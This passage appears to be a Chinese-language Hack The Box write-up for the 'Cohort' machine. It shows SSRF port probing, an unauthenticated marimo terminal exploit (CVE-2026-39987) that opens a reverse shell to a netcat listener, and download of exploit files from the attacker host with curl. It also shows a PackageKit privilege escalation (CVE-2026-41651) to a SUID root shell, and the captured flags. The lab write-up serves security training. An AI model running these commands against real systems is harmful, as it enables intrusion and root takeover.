+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">seq <span class="m">1</span> <span class="m">10000</span> <span class="p">|</span> xargs -P <span class="m">30</span> -I <span class="o">{}</span> sh -c <span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">curl -sk --max-time 3 -X POST https://cohort.htb/api/validate \
+</span></span></span><span class="line"><span class="cl"><span class="s1">-d &#34;{\&#34;url\&#34;:\&#34;http://127.1:{}/\&#34;}&#34; | grep -q &#34;Connection refused&#34; || echo &#34;OPEN: {}&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>-P 30</code> 并发数为 30，<code>-I {}</code> 等价于刚才的 <code>$p</code>。</p>
+<p>探测出五个开放的端口，其中包含两个内网端口 <code>5000</code> 和 <code>8888</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">OPEN: <span class="m">22</span>
+</span></span><span class="line"><span class="cl">OPEN: <span class="m">80</span>
+</span></span><span class="line"><span class="cl">OPEN: <span class="m">443</span>
+</span></span><span class="line"><span class="cl">OPEN: <span class="m">5000</span>
+</span></span><span class="line"><span class="cl">OPEN: <span class="m">8888</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问 <code>5000</code>，回显 <code>405 Method not allowed.</code> 由于此处限制只能使用 <code>http/https</code> 协议，所以无法调整为除 <code>GET</code> 外的请求方式。</p>
+<p>访问 <code>8888</code>，返回一个 <code>html</code> 页面。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>marimo<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">    background-color: #f4f4f9;
+</span></span></span><span class="line"><span class="cl"><span class="s">    display: flex;
+</span></span></span><span class="line"><span class="cl"><span class="s">    justify-content: center;
+</span></span></span><span class="line"><span class="cl"><span class="s">    align-items: center;
+</span></span></span><span class="line"><span class="cl"><span class="s">    height: 100vh;
+</span></span></span><span class="line"><span class="cl"><span class="s">    margin: 0;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;/auth/login&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">    padding: 20px;
+</span></span></span><span class="line"><span class="cl"><span class="s">    background-color: white;
+</span></span></span><span class="line"><span class="cl"><span class="s">    border-radius: 8px;
+</span></span></span><span class="line"><span class="cl"><span class="s">    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+</span></span></span><span class="line"><span class="cl"><span class="s">    width: 300px;
+</span></span></span><span class="line"><span class="cl"><span class="s">    text-align: center;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;margin-bottom: 20px;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">        display: block;
+</span></span></span><span class="line"><span class="cl"><span class="s">        margin-bottom: 5px;
+</span></span></span><span class="line"><span class="cl"><span class="s">        font-size: 16px;
+</span></span></span><span class="line"><span class="cl"><span class="s">        font-family: Arial, sans-serif;
+</span></span></span><span class="line"><span class="cl"><span class="s">        color: #333;&#34;</span><span class="p">&gt;</span>Access Token / Password<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">        width: 100%;
+</span></span></span><span class="line"><span class="cl"><span class="s">        box-sizing: border-box;
+</span></span></span><span class="line"><span class="cl"><span class="s">        padding: 8px;
+</span></span></span><span class="line"><span class="cl"><span class="s">        border: 1px solid #ccc;
+</span></span></span><span class="line"><span class="cl"><span class="s">        border-radius: 4px;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">        background-color: #1C7362;
+</span></span></span><span class="line"><span class="cl"><span class="s">        color: white;
+</span></span></span><span class="line"><span class="cl"><span class="s">        padding: 10px 20px;
+</span></span></span><span class="line"><span class="cl"><span class="s">        border: none;
+</span></span></span><span class="line"><span class="cl"><span class="s">        border-radius: 4px;
+</span></span></span><span class="line"><span class="cl"><span class="s">        cursor: pointer;
+</span></span></span><span class="line"><span class="cl"><span class="s">        width: 100%;
+</span></span></span><span class="line"><span class="cl"><span class="s">        font-size: 16px;&#34;</span><span class="p">&gt;</span>Login<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;color: red;&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据标题可知是 <code>marimo</code>，是新一代开源 Python 交互式笔记本，支持响应式执行。像电子表格一样，改一个单元格，自动把所有依赖它的单元格重新跑一遍。</p>
+<p>访问 <code>/api/version</code> 即可查看其版本信息。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -sk -X POST https://cohort.htb/api/validate -d <span class="s1">&#39;{&#34;url&#34;: &#34;http://127.1:8888/api/version&#34;}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;ok&#34;</span>: true, <span class="s2">&#34;fetched_status&#34;</span>: 200, <span class="s2">&#34;content_type&#34;</span>: <span class="s2">&#34;text/plain; charset=utf-8&#34;</span>, <span class="s2">&#34;preview&#34;</span>: <span class="s2">&#34;0.20.4&#34;</span>, <span class="s2">&#34;message&#34;</span>: <span class="s2">&#34;Source reachable.&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可知版本为 <code>0.20.4</code>，该版本受到 <strong>CVE-2026-39987</strong> 影响，可导致未授权 RCE。但由于我们通过 SSRF 只能传 <code>GET</code> 请求，无法自定义请求包，所以此处通过 SSRF 利用不了。</p>
+<p>但是由于 <code>marimo</code> 不仅限于回环地址，还可以通过每个笔记本电脑的动态主机名访问，只需在 <code>cohort.htb</code> 前加上 <code>nb-&lt;id&gt;</code>，nginx 会将主机名直接代理到 127.0.0.1:8888。</p>
+<p>通过访问 <code>nginx-status</code> 或 <code>status</code> 去获取 nginx 的状态页面，其中暴露了 <code>nb-&lt;notebook-id&gt;</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -sk -X POST https://cohort.htb/api/validate -d <span class="s1">&#39;{&#34;url&#34;: &#34;http://127.1/status&#34;}&#39;</span> <span class="p">|</span> jq .
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;ok&#34;</span>: true,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;fetched_status&#34;</span>: 200,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;content_type&#34;</span>: <span class="s2">&#34;application/json&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;preview&#34;</span>: <span class="s2">&#34;{\&#34;service\&#34;:\&#34;cohort-edge\&#34;,\&#34;status\&#34;:\&#34;ok\&#34;,\&#34;generated_by\&#34;:\&#34;nginx\&#34;,\&#34;upstreams\&#34;:[{\&#34;name\&#34;:\&#34;marketing\&#34;,\&#34;host\&#34;:\&#34;cohort.htb\&#34;,\&#34;root\&#34;:\&#34;/var/www/cohort\&#34;},{\&#34;name\&#34;:\&#34;insights-api\&#34;,\&#34;host\&#34;:\&#34;cohort.htb\&#34;,\&#34;path\&#34;:\&#34;/api/\&#34;,\&#34;target\&#34;:\&#34;127.0.0.1:5000\&#34;},{\&#34;name\&#34;:\&#34;notebooks\&#34;,\&#34;host\&#34;:\&#34;nb-1be3782a8afd3ad5.cohort.htb\&#34;,\&#34;target\&#34;:\&#34;127.0.0.1:8888\&#34;,\&#34;note\&#34;:\&#34;internal analyst workspace, not for external use\&#34;}]}&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;message&#34;</span>: <span class="s2">&#34;Source reachable.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>添加 <code>hosts</code> 规则。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.129.52.57 nb-1be3782a8afd3ad5.cohort.htb&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/20.-cohort/assets/image-20261115150326668.png"
+	width="1365"
+	height="989"
+	srcset="/p/20.-cohort/assets/image-20261115150326668_hu2121028476666747760.png 480w, /p/20.-cohort/assets/image-20261115150326668_hu15523739450764752568.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261115150326668"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="138"
+		data-flex-basis="331px"
+	
+></p>
+<h3 id="cve-2026-39987">CVE-2026-39987
+</h3><p>Marimo 自带一个 WebSocket 终端接口 <code>/terminal/ws</code>，没有写身份校验代码，只要能完成 WebSocket 握手连上这个地址，就能直接获得一个 PTY 交互式 shell，权限就是启动 marimo 的用户。</p>
+<p>找对应脚本：https://www.exploit-db.com/exploits/52673</p>
+<p>提前开启端口监听。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行脚本反弹 Shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 CVE-2026-39987.py -u https://nb-1be3782a8afd3ad5.cohort.htb --lhost 10.10.17.69 --lport <span class="m">1234</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Connecting to wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Executing reverse shell!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Check your netcat listener on port 1234!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取到 Shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.17.69<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.52.57<span class="o">]</span> <span class="m">43362</span>
+</span></span><span class="line"><span class="cl">bash: initialize_job_control: no job control in background: Bad file descriptor
+</span></span><span class="line"><span class="cl">marimo@cohort:~$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>marimo<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>marimo<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>marimo<span class="o">)</span>
+</span></span><span class="line"><span class="cl">marimo@cohort:~$ cat user.txt
+</span></span><span class="line"><span class="cl">cat user.txt
+</span></span><span class="line"><span class="cl">943265d3315eb6e3886ea27099b21826
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到 user flag：<code>943265d3315eb6e3886ea27099b21826</code></p>
+<h2 id="提权">提权
+</h2><h3 id="linpeas-扫描">Linpeas 扫描
+</h3><p>通过 <code>Linpeas</code> 来自动化探测可能存在的提权路径。</p>
+<p>先在攻击机开启一个 Web 服务供靶机访问：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# cp /usr/share/peass/linpeas/linpeas.sh ./ 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 -m http.server <span class="m">8000</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶机访问并下载 <code>linpeas.sh</code> ，赋予执行权限后执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">marimo@cohort:~$ curl http://10.10.17.69:8000/linpeas.sh -o linpeas.sh
+</span></span><span class="line"><span class="cl">curl http://10.10.17.69:8000/linpeas.sh -o linpeas.sh
+</span></span><span class="line"><span class="cl">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span class="line"><span class="cl">                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span class="line"><span class="cl"><span class="m">100</span> 1128k  <span class="m">100</span> 1128k    <span class="m">0</span>     <span class="m">0</span>   285k      <span class="m">0</span>  0:00:03  0:00:03 --:--:--  285k
+</span></span><span class="line"><span class="cl">marimo@cohort:~$ chmod +x linpeas.sh
+</span></span><span class="line"><span class="cl">chmod +x linpeas.sh
+</span></span><span class="line"><span class="cl">marimo@cohort:~$ ./linpeas.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="cve-2026-41651-pack2theroot">CVE-2026-41651 (Pack2TheRoot)
+</h3><p>PackageKit 是 Linux 统一包管理抽象层，后台守护进程 <code>packagekitd</code> 以 <code>root</code> 运行，给图形界面提供安装/更新软件的 API，底层调用 <code>apt/dnf/yum</code>。</p>
+<p><img src="/p/20.-cohort/assets/image-20261115153633127.png"
+	width="1249"
+	height="373"
+	srcset="/p/20.-cohort/assets/image-20261115153633127_hu15276906013173520314.png 480w, /p/20.-cohort/assets/image-20261115153633127_hu12457530513835816283.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261115153633127"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="334"
+		data-flex-basis="803px"
+	
+></p>
+<p>CVE-2026-41651，“Pack2TheRoot”，是 PackageKit 的 InstallFiles 处理中一个确定性的（非竞争性的）TOCTOU 漏洞。</p>
+<p>快速连续调用两次 <code>InstallFiles()</code>——第一次使用 SIMULATE，跳过 polkit 提示，第二次使用真正的标志——让第二次调用在 GLib 的空闲回调运行之前覆盖缓存的事务状态。</p>
+<p>然后，守护进程会以 root 用户身份安装第二个调用指向的内容，无需身份验证提示。由于它是确定性的，因此不存在竞争条件——它直接就能运行。</p>
+<p>利用脚本：https://github.com/ashrafzaryouh/CVE-2026-41651</p>
+<p>攻击机准备好脚本，开放 HTTP 服务供靶机下载：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# vim CVE-2026-41651.py
+</span></span><span class="line"><span class="cl">                                                                                       
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 -m http.server <span class="m">8000</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶机下载脚本并执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">marimo@cohort:~$ curl http://10.10.17.69:8000/CVE-2026-41651.py -o exp.py
+</span></span><span class="line"><span class="cl">curl http://10.10.17.69:8000/CVE-2026-41651.py -o exp.py
+</span></span><span class="line"><span class="cl">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span class="line"><span class="cl">                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span class="line"><span class="cl"><span class="m">100</span> <span class="m">12647</span>  <span class="m">100</span> <span class="m">12647</span>    <span class="m">0</span>     <span class="m">0</span>  <span class="m">27126</span>      <span class="m">0</span> --:--:-- --:--:-- --:--:-- <span class="m">27139</span>
+</span></span><span class="line"><span class="cl">marimo@cohort:~$ python3 exp.py
+</span></span><span class="line"><span class="cl">python3 exp.py
+</span></span><span class="line"><span class="cl"><span class="o">============================================================</span>
+</span></span><span class="line"><span class="cl">  CVE-2026-41651 — <span class="nv">Pack2TheRoot</span> <span class="o">=</span>&gt; PackageKit TOCTOU Privilege Escalation
+</span></span><span class="line"><span class="cl">  github : https://github.com/0xBlackash/CVE-2026-41651/
+</span></span><span class="line"><span class="cl">  Author : Ashraf Zaryouh / @0xBlackash
+</span></span><span class="line"><span class="cl"><span class="o">============================================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> SUID drop directory: /var/tmp  <span class="o">(</span>no nosuid/noexec<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Package format: DEB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Building <span class="nb">test</span> packages...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Dummy pkg:   /tmp/pk-dummy-120716.deb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Payload pkg: /tmp/pk-payload-120716.deb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Payload installs SUID bash to: /var/tmp/.suid_bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to system D-Bus...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating PackageKit transaction...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Transaction ID: /2_bdabcbee
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Firing TOCTOU race <span class="o">(</span>SIMULATE → REAL on same transaction<span class="o">)</span>...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Polling <span class="k">for</span> SUID at /var/tmp/.suid_bash <span class="o">(</span>90s max<span class="o">)</span>...
+</span></span><span class="line"><span class="cl">..id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>marimo<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>marimo<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>marimo<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/home/marimo
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /root<span class="p">;</span>cat root.txt
+</span></span><span class="line"><span class="cl">2a1a44e2581ae12824c832706f0f1792
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到 root flag：<code>2a1a44e2581ae12824c832706f0f1792</code></p>
+<h1 id="总结">总结
+</h1><ul>
+<li>端口扫描</li>
+<li>SSRF 黑名单绕过与端口探测</li>
+<li>CVE-2026-39987 marimo RCE</li>
+<li>CVE-2026-41651 Pack2TheRoot</li>
+</ul>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
